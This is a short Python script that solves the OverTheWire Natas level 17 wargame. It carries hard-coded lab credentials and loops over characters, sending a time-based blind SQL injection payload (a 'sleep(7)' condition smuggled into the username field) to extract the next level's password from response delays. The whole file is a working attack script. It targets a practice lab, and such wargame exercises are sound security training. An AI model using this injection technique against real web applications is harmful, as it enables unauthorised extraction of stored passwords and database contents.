import requests
import string

username='natas17'
password='EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url='http://natas17.natas.labs.overthewire.org/'
letters=string.ascii_letters+string.digits

natas18=''

while len(natas18)<32:
    for char in letters:
        guess=natas18+char
        response=requests.post(
            url,
            auth=(username,password),
            data={"username":f'natas18" AND if(BINARY password like "{guess}%",sleep(7),0)#'}
        )
    
        if response.elapsed.total_seconds()>7: # 응답 시간 초로 변환
            natas18+=char
            print(natas18)
            break
